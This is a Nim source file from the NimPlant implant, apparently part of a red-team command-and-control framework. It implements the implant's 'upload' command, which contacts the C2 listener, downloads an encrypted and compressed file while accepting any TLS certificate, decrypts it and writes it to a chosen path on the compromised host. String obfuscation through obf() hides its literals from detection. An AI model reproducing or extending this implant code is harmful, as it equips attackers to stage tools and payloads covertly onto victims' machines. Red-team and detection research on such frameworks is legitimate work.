from ../util/webClient import Listener
from os import getcurrentdir, `/`
from strutils import join, split, toLowerAscii
from zippy import uncompress
import ../util/crypto
import puppy

# Upload a file from the C2 server to NimPlant
# From NimPlant's perspective this is similar to wget, but calling to the C2 server instead
proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
    var 
        fileId : string
        fileName : string
        filePath : string
        url : string

    if args.len == 2 and args[0] != "" and args[1] != "":
        fileId = args[0]
        fileName = args[1]
        filePath = getCurrentDir()/fileName
    elif args.len >= 3:
        fileId = args[0]
        fileName = args[1]
        filePath = args[2 .. ^1].join(obf(" "))
    else:
        # Handling of the second argument (filename) is done by the python server
        result = obf("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.")
        return
    
    url = toLowerAscii(li.listenerType) & obf("://")
    if li.listenerHost != "":
        url = url & li.listenerHost
    else:
        url = url & li.listenerIp & obf(":") & li.listenerPort
    url = url & li.taskpath & obf("/") & fileId

    # Get the file - Puppy will take care of transparent deflation of the gzip layer
    let req = Request(
        url: parseUrl(url),
        headers: @[
                Header(key: obf("User-Agent"), value: li.userAgent),
                Header(key: obf("X-Identifier"), value: li.id), # Nimplant ID
                Header(key: obf("X-Unique-ID"), value: cmdGuid)  # Task GUID
            ],
        allowAnyHttpsCertificate: true,
    )
    let res: Response = fetch(req)

    # Check the result
    if res.code != 200:
        result = obf("Something went wrong uploading the file (NimPlant did not receive response from staging server '") & url & obf("').")
        return
    
    # Handle the encrypted and compressed response
    var dec = decryptData(res.body, li.cryptKey)
    var decStr: string = cast[string](dec)
    var fileBuffer: seq[byte] = convertToByteSeq(uncompress(decStr))

    # Write the file to the target path
    filePath.writeFile(fileBuffer)
    result = obf("Uploaded file to '") & filePath & obf("'.")